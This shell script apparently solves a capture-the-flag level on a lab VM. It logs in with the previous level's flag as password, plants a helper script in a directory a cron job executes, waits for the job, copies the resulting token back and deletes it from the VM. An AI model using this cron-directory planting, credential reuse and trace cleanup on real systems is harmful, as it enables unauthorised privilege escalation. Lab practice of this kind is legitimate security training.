#!/bin/sh -eu

PREVIOUS_FLAG=../../level04/flag
ADDRESS=192.168.122.214
PORT=4242
OPEN_ARENA=/opt/openarenaserver
FLAG=../flag

# Copy the `save_token_to_file.sh` file to the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} -p save_token_to_file.sh level05@${ADDRESS}:${OPEN_ARENA}

# Connect to the virtual machine using SSH and run the script
# to wait for the next cron job (occurs every 2 minutes)
sshpass -f ${PREVIOUS_FLAG} <wait_for_cron_job.sh 2>/dev/null \
	ssh -p ${PORT} level05@${ADDRESS} 'sh -s'

# Wait for the cron job to complete its tasks
sleep 2

# Copy the token to the host machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} level05@${ADDRESS}:${OPEN_ARENA}/.token ${FLAG}

# Clean the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level05@${ADDRESS} 'rm /opt/openarenaserver/.token'

exit 0
